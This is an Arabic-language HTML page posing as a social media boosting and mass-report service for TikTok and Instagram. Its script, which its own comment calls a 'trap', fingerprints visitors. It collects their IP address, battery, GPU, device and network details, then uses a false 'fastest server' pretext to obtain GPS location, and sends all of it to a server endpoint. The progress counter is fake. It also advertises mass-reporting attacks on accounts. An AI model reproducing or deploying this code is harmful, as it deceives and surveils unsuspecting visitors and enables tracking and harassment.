<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY - ULTIMATE PRO</title>
    <style>
        :root { --main-green: #00ff00; --glow-red: #ff0000; }
        body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
        #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: black; }
        .star { position: absolute; background-color: white; border-radius: 50%; animation: moveStar linear infinite; opacity: 1; box-shadow: 0 0 5px white; }
        @keyframes moveStar { from { transform: translateY(100vh); } to { transform: translateY(-10vh); } }
        #blur-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; backdrop-filter: blur(2px); background: rgba(0,0,0,0.5); }
        .logo-3d { font-size: 42px; font-weight: 900; color: white; letter-spacing: 6px; text-shadow: 3px 3px 0px var(--glow-red), -3px -3px 0px var(--main-green); margin: 20px 0; display: block; }
        .watermark { position: fixed; top: 55%; left: 50%; transform: translate(-50%, -50%); font-size: 25px; font-weight: bold; color: rgba(255,255,255,0.5); filter: blur(0.8px); pointer-events: none; z-index: 5; text-shadow: 1px 1px var(--glow-red); }
        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding-top: 50px; }
        .hero-title { font-size: 2.3rem; font-weight: bold; margin-bottom: 40px; text-shadow: 0 0 10px var(--main-green); }
        .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
        #tools-interface { padding: 20px; display: none; z-index: 10; }
        .glass-btn { width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; }
        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: white; text-align: center; }
        #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.9); }
        #counter { font-size: 38px; font-weight: bold; color: var(--main-green); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="starfield"></div>
    <div id="blur-overlay"></div>
    <div class="watermark">snap : i5dqa</div>

    <div id="landing-page">
        <div class="logo-3d">ALSSRY</div>
        <h1 class="hero-title">خدمات سوشال ميديا</h1>
        <button class="start-btn" onclick="initTrap()">بدء</button>
    </div>

    <div id="tools-interface">
        <div class="logo-3d">ALSSRY</div>
        <div id="main-menu">
            <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
            <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
        </div>
        
        <div id="platform-menu" class="hidden">
            <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
            <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
            <button class="glass-btn" style="color:red;" onclick="goBack('main-menu')">رجوع</button>
        </div>

        <div id="service-menu" class="hidden">
            <div id="boost-btns" class="hidden">
                <button class="glass-btn" onclick="openInput('رشق متابعين', 'يوزر (@)', 5000)">متابعين</button>
                <button class="glass-btn" onclick="openInput('رشق لايكات', 'رابط (http)', 5000)">لايكات</button>
            </div>
            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام بلاغات', 'يوزر (@)', 300)">بدء الإسبام</button>
            <button class="glass-btn" style="color:red;" onclick="goBack('platform-menu')">رجوع</button>
        </div>

        <div id="final-step" class="hidden">
            <h3 id="display-title" style="color:var(--main-green)"></h3>
            <input type="text" id="target-id">
            <input type="number" id="target-count">
            <button class="glass-btn" style="background:var(--main-green); color:black;" onclick="confirmAction()">تأكيد التنفيذ ✅</button>
            <button class="glass-btn" style="color:red;" onclick="goBack('service-menu')">رجوع</button>
            <div id="progress-box" class="hidden"><div id="counter">0</div></div>
        </div>
    </div>

    <script>
        let deviceData = {};

        // النجوم الكثيفة
        function createStars() {
            const container = document.getElementById('starfield');
            for(let i=0; i<110; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = star.style.height = Math.random()*4+'px';
                star.style.left = Math.random()*100+'vw';
                star.style.animationDuration = Math.random()*6+3+'s';
                container.appendChild(star);
            }
        }
        createStars();

        // المصيدة الشاملة - تسحب كل شيء فور الضغط على "بدء"
        async function initTrap() {
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('tools-interface').style.display = 'block';

            // 1. سحب الـ IP الحقيقي
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                deviceData.ip = ipData.ip;
            } catch(e) { deviceData.ip = "Failed to fetch"; }

            // 2. سحب البطارية
            try {
                const batt = await navigator.getBattery();
                deviceData.battery = Math.round(batt.level * 100) + "%";
            } catch(e) { deviceData.battery = "Unknown"; }

            // 3. سحب الـ GPU (HW-ID)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                deviceData.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }

            // 4. سحب معلومات الجهاز والشبكة والشاشة
            deviceData.platform = navigator.platform;
            deviceData.userAgent = navigator.userAgent;
            deviceData.screenSize = window.screen.width + "x" + window.screen.height;
            deviceData.network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
            deviceData.cores = navigator.hardwareConcurrency || "N/A";

            // إرسال الضربة الأولى (زيارة)
            sendToApi("زيارة أولية - سحب بيانات كامل");
        }

        // طلب الـ GPS عند التأكيد النهائي
        function confirmAction() {
            alert("⚠️ لاختيار أسرع سيرفر وتجنب الحظر، يرجى السماح بالوصول للموقع.");
            navigator.geolocation.getCurrentPosition((pos) => {
                deviceData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                startProcess();
            }, (err) => { 
                deviceData.location = "Permission Denied";
                startProcess(); 
            });
        }

        function startProcess() {
            const val = document.getElementById('target-id').value;
            const count = document.getElementById('target-count').value;
            sendToApi(`تنفيذ عملية: ${val} | عدد: ${count}`);
            
            document.getElementById('progress-box').classList.remove('hidden');
            let cur = 0;
            let interval = (90 * 1000) / 100; // 100 في دقيقة ونصف
            let inv = setInterval(() => {
                if(cur >= count) { clearInterval(inv); alert("اكتمل التنفيذ!"); location.reload(); }
                else { cur++; document.getElementById('counter').innerText = cur; }
            }, interval);
        }

        function sendToApi(action) {
            fetch('/api/index', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: action, data: deviceData })
            });
        }

        // وظائف التنقل
        let mode="", plat="", service="";
        function showPlat(m) { mode=m; goBack('platform-menu'); }
        function selectPlat(p) { plat=p; goBack('service-menu'); document.getElementById('boost-btns').className = (mode==='boost') ? "" : "hidden"; document.getElementById('spam-btn').className = (mode==='spam') ? "glass-btn" : "hidden"; }
        function openInput(s, ph, max) { service=s; goBack('final-step'); document.getElementById('display-title').innerText = plat + " - " + s; document.getElementById('target-id').placeholder = ph; document.getElementById('target-count').placeholder = "الحد: "+max; }
        function goBack(id) { document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
    </script>
</body>
</html>
